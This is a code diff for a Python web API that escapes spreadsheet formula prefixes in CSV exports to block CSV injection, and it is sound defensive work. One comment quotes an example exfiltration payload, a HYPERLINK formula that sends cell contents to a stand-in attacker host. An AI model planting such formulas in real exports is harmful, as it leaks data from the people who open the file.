@@ -31,8 +31,32 @@ def require_internal_caller(x_internal_key: Optional[str] = Header(default=None)
         raise HTTPException(status_code=401, detail="Missing or invalid internal API key")
 
 
+# CSV injection (CWE-1236): every export here carries free-text fields a
+# Staff member can set (product/SKU/category/location names, a stock
+# movement's `reason`), and the reader on the other end is an Owner opening
+# the file in Excel/Sheets. A cell whose text starts with `=`, `+`, `-`, `@`,
+# or a tab/CR is interpreted as a formula by those apps regardless of this
+# API's own `text/csv` content type, so a value like `=HYPERLINK("http://
+# evil.example/"&A1)` typed into an ADJUSTMENT reason runs the moment the
+# export is opened. Only `str` values are touched — every numeric/bool/date
+# field here (quantities, prices, a movement's own negative `quantity`) is
+# already a native Python type by this point, not a stringified number, so
+# the one legitimate case that starts with `-` is never in scope.
+_DANGEROUS_CSV_PREFIXES = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _sanitize_csv_value(value: Any) -> Any:
+    if isinstance(value, str) and value.startswith(_DANGEROUS_CSV_PREFIXES):
+        return "'" + value
+    return value
+
+
+def _sanitize_csv_rows(rows: list[dict[str, Any]]) -> list[dict[str, Any]]:
+    return [{key: _sanitize_csv_value(value) for key, value in row.items()} for row in rows]
+
+
 def _csv_response(rows: list[dict[str, Any]], filename: str) -> Response:
-    df = pd.DataFrame(rows)
+    df = pd.DataFrame(_sanitize_csv_rows(rows))
     buffer = StringIO()
     df.to_csv(buffer, index=False)
     return Response(
